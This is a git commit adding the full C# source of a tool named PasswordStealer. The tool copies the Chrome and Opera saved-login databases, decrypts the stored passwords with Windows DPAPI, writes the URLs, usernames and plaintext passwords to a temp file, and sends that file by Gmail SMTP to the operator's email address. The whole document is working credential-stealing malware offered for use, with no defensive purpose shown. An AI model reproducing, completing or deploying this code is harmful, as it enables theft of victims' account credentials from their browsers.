7ed27ff2b445a49213f142771f2896f0c9bd61af
Alexander Trambovetskyi <deprydepp@gmail.com>
2019-12-22 18:18:37 +0200

    Commit

---
+++ PasswordStealer/Passwords.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Security;
+
+namespace PasswordStealer
+{
+    public static class Passwords
+    {
+        public static IEnumerable<Tuple<string, string, string>> ReadPass(string dbPath)
+        {
+            if (File.Exists(Path.GetTempPath() + @"StealLog\Login Data"))
+                    File.Delete(Path.GetTempPath() + @"StealLog\Login Data");
+
+            File.Copy(dbPath, Path.GetTempPath() + @"StealLog\Login Data");
+            dbPath = Path.GetTempPath() + @"StealLog\Login Data";
+
+            var connectionString = $"Data Source={dbPath}; pooling=false";
+
+            using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
+            {
+                using (var cmd = conn.CreateCommand())
+                {
+                    cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";
+                    conn.Open();
+                    using (var reader = cmd.ExecuteReader())
+                    {
+                        while (reader.Read())
+                        {
+                            var encryptedData = (byte[])reader[0];
+                            var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData,
+                                null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
+
+                            var plainText = Encoding.ASCII.GetString(decodedData);
+                            yield return Tuple.Create(reader.GetString(2), reader.GetString(1), plainText);
+                        }
+                    }
+                    conn.Close();
+                }
+            }
+        }
+    }
+}
---
+++ PasswordStealer/Program.cs
@@ -0,0 +1,82 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Mail;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace PasswordStealer
+{
+    class Program
+    {
+        // Passwords.txt is stored in Temp folder in AppData
+        private static string[] paths = { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
+                + @"\Google\Chrome\User Data\Default\Login Data",
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
+                + @"\Opera Software\Opera Stable\Login Data"};
+        private static string pwd_text = "";
+        static void Main(string[] args)
+        {
+            Directory.CreateDirectory(Path.GetTempPath() + "StealLog");
+
+            PasswordReader();
+            DeleteLogData();
+            PasswordWriter();
+            SendEmail();
+
+        }
+
+        private static void PasswordReader()
+        {
+            foreach (string folder in paths)
+            {
+                var pas = Passwords.ReadPass(folder);
+                if (File.Exists(folder))
+                {
+                    pwd_text += "Stealer by: @Trambowetsky\r\n\r\n";
+                    foreach (var item in pas)
+                    {
+                        if ((item.Item2.Length > 0) && (item.Item3.Length > 0))
+                        {
+                            pwd_text += $"URL: {item.Item1} \r\n Login: {item.Item2} \r\n Password: {item.Item3} \r\n";
+                            pwd_text += "\r\n";
+                        }
+                    }
+                }
+            }
+        }
+        private static void DeleteLogData()
+        {
+            if (File.Exists(Path.GetTempPath() + @"StealLog\Login Data"))
+                File.Delete(Path.GetTempPath() + @"StealLog\Login Data");
+        }
+        private static void PasswordWriter()
+        {
+            File.WriteAllText(Path.GetTempPath() + @"StealLog\Passwords.txt", pwd_text);
+        }
+
+        private static void SendEmail()
+        {
+            using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
+            {
+                smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
+                smtp.UseDefaultCredentials = false;
+                smtp.Credentials = new NetworkCredential("login goes here", "password here"); // sender-email
+                smtp.EnableSsl = true;
+                MailMessage msg = new MailMessage("sender email", "your main email", // first arg - sender-email, second - email, that gets pswrds
+                                                  "Log || Passwords", "Stealer by @Trambowetsky");
+
+                msg.Attachments.Add(new Attachment(Path.GetTempPath() + @"StealLog\Passwords.txt"));
+
+                try
+                {
+                    smtp.Send(msg);
+                }
+                catch (Exception e)
+                { Console.WriteLine(e); };
+            }
+        }
+    }
+}
